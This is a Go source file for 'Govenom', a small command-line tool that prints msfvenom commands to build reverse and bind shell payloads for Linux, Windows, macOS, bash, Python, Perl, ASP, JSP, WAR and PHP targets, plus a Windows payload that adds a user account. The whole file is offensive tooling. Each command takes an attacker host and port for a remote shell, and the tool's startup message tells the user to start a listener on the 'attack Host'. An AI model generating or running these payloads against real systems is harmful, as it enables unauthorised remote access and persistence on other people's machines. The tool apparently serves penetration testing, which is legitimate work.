package main

import (
  "fmt"
  "log"
  "os"
  "sort"

  . "github.com/logrusorgru/aurora"
  "github.com/urfave/cli"
)

func main() {
	app := cli.NewApp()
	app.Name = "Govenom"
	app.Usage = "Generate MSFVenom shells in command line :)"

	myFlags := []cli.Flag {
		&cli.StringFlag{
			Name: "lhost",
			Value: "127.0.0.1",
		},
		&cli.StringFlag{
			Name: "port",
			Value: "4444",
		},
		&cli.StringFlag{
			Name: "rhost",
			Value: "192.168.1.1",
		},
		&cli.StringFlag{
			Name: "user",
			Value: "hacker",
		},
		&cli.StringFlag{
			Name: "pass",
			Value: "password",
		},
	}

	app.Commands = []cli.Command{
		{
			Name:  "linux",
			Usage: "Generate Linux Meterpreter reverse/bind shell x86 multi stage :)",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Print(fmt.Sprint(Magenta(" #1   Linux reverse shell: ")))
				fmt.Printf("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > shell.elf \n", c.String("lhost"), c.String("port"))

				fmt.Print(fmt.Sprint(Magenta(" #2   Linux bind shell: ")))
				fmt.Printf("msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=%s LPORT=%s -f elf > shell.elf\n", c.String("rhost"), c.String("port"))
				return nil
			},
		},
		{
			Name:  "windows",
			Usage: "Generate Windows Meterpreter muti shells :)",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Print(fmt.Sprint(Magenta(" #1   Windows Meterpreter reverse shell: ")))
				fmt.Printf("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > shell.exe \n", c.String("lhost"), c.String("port"))

				fmt.Print(fmt.Sprint(Magenta(" #2   Windows Meterpreter http reverse shell: ")))
				fmt.Printf("msfvenom -p windows/meterpreter_reverse_http LHOST=%s LPORT=%s HttpUserAgent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\" -f exe > shell.exe \n", c.String("lhost"), c.String("port"))
				
				fmt.Print(fmt.Sprint(Magenta(" #3   Windows Meterpreter bind shell: ")))
				fmt.Printf("msfvenom -p windows/meterpreter/bind_tcp RHOST= %s LPORT=%s -f exe > shell.exe \n", c.String("rhost"), c.String("port"))

				fmt.Print(fmt.Sprint(Magenta(" #4   Windows CMD Multi Stage: ")))
				fmt.Printf("msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > shell.exe \n", c.String("lhost"), c.String("port"))

				fmt.Print(fmt.Sprint(Magenta(" #5   Windows add user: ")))
				fmt.Printf("msfvenom -p windows/adduser USER=%s PASS=%s -f exe > useradd.exe \n", c.String("user"), c.String("pass"))
				return nil
			},
		},
		{
			Name:  "macos",
			Usage: "Generate MacOS Meterpreter reverse/bind shells :)",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Print(fmt.Sprint(Magenta(" #1   MacOS reverse shell: ")))
				fmt.Printf("msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f macho > shell.macho \n", c.String("lhost"), c.String("port"))

				fmt.Print(fmt.Sprint(Magenta(" #2   MacOS bind shell: ")))
				fmt.Printf("msfvenom -p osx/x86/shell_bind_tcp RHOST=%s LPORT=%s -f macho > shell.macho \n", c.String("rhost"), c.String("port"))
				return nil
			},
		},
		{
			Name: "bash",
			Usage: "Generate a Bash reverse shell",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Printf("msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw > shell.sh \n", c.String("lhost"), c.String("port"))
				return nil
			},
		},
		{
			Name: "python",
			Usage: "Generate a Python reverse shell",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Printf("msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw > shell.py \n", c.String("lhost"), c.String("port"))
				return nil
			},
		},
		{
			Name: "perl",
			Usage: "Generate a Perl reverse shell",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Printf("msfvenom -p cmd/unix/reverse_perl LHOST=%s LPORT=%s -f raw > shell.pl \n", c.String("lhost"), c.String("port"))
				return nil
			},
		},
		{
			Name: "asp",
			Usage: "Generate a ASP Meterpreter shell",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Printf("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp > shell.asp \n", c.String("lhost"), c.String("port"))
				return nil
			},
		},
		{
			Name: "jsp",
			Usage: "Generate a Jsp reverse shell",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Printf("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw > shell.jsp \n", c.String("lhost"), c.String("port"))
				return nil
			},
		},
		{
			Name: "war",
			Usage: "Generate a War reverse shell",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Printf("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war > shell.war \n", c.String("lhost"), c.String("port"))
				return nil
			},
		},
		{
			Name: "php",
			Usage: "Generate PHP reverse shells",
			Flags: myFlags,
			Action: func(c *cli.Context) error {
				fmt.Print(fmt.Sprint(Magenta(" #1  PHP Meterpreter shell: ")))
				fmt.Printf("msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw > shell.php \n", c.String("lhost"), c.String("port"))
				
				fmt.Print(fmt.Sprint(Magenta(" #2  PHP reverse shell: ")))
				fmt.Printf("msfvenom -p php/reverse_php LHOST=%s LPORT=%s -f raw > phpreverseshell.php \n", c.String("lhost"), c.String("port"))
				return nil
			},
		},
 	}

  	// Start message
	fmt.Print(fmt.Sprint(Blue("Govenom - (c)2021 - arch3rPro \n").Bold()))
	fmt.Print(fmt.Sprint(Red("Note that you need to generate a listener by msfconsole on your attack Host !\n\n").Bold()))
	  
	// Sort commands list in help panel by name
	sort.Sort(cli.CommandsByName(app.Commands))
  	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
  	}
}